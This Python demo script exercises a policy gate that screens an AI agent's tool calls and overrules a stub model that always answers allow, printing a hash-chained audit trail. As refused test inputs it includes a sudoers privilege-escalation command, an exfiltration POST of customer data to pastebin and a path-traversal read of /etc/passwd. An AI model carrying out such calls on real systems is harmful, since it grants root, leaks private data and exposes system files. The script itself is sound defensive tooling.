"""Demonstrate the gate on a runnable agent scenario.

    python3 examples/demo.py

Shows, in order: an allowed read, a refused privilege escalation, a refused
exfiltration, an escalation for an irreversible action, an uncovered call (the model
tries to allow it and is overruled), and the audit trail with its hash chain verified.

No model backend is required: `StaticModel` stands in for one so the demo is
deterministic and can run anywhere. Every decision below is produced by the same
`Gate.evaluate` a real deployment would call.
"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from policygate import AuditLog, Effect, Gate, StaticModel, ToolCall, load_policy  # noqa: E402

POLICY_PATH = ROOT / "examples" / "policy.toml"


def main() -> int:
    policy = load_policy(POLICY_PATH)

    # A stand-in for a model backend. It is configured to answer "allow" on every
    # uncovered call, which is the most permissive thing a backend could do — and the
    # point of the demo is that it is overruled rather than obeyed.
    model = StaticModel(
        effect=Effect.ALLOW,
        rule_id="allow-read-only",
        reason="the command looks like a routine maintenance task",
        confidence=0.93,
    )

    audit = AuditLog(ROOT / "examples" / "audit.jsonl")
    audit.path.unlink(missing_ok=True)
    gate = Gate(policy, model=model, audit=AuditLog(ROOT / "examples" / "audit.jsonl"))

    calls = [
        ToolCall(tool="lookup_order", args={"order_id": "A-1042"}),
        ToolCall(tool="run_shell", args={"command": "echo 'app ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"}),
        ToolCall(tool="http_post", args={"url": "https://pastebin.com/api", "body": "customer table"}),
        ToolCall(tool="send_email", args={"to": "customer@example.com", "body": "your refund is on its way"}),
        ToolCall(tool="read_report", args={"name": "../../etc/passwd"}),
        ToolCall(tool="rotate_api_key", args={"service": "billing"}),
    ]

    print("Policy gate demo — model backend is configured to say ALLOW every time\n" + "=" * 78)
    for call in calls:
        decision = gate.evaluate(call)
        print(f"\n{call.render()}")
        print(f"  → {decision}")

    print("\n" + "=" * 78)
    print("Audit trail (hash-chained)\n")
    for entry in gate.audit.last(8):
        if entry["kind"] == "decision":
            print(f"  {entry['effect']:<9} by {entry['decided_by']:<20} rule={entry['rule']}")
        else:
            print(f"  note: {entry['kind']} — {entry['detail']}")

    print("\nsummary:", gate.audit.summary())
    ok, message = gate.audit.verify()
    print(f"chain verify: {'OK' if ok else 'BROKEN'} — {message}")

    print("\n" + "=" * 78)
    print("How one of those was decided:\n")
    print(gate.explain(calls[5]))

    print(
        "\nThe model answered ALLOW on the uncovered call (`rotate_api_key`) and was "
        "\noverruled — an advisor can tighten a decision and cannot authorise one."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
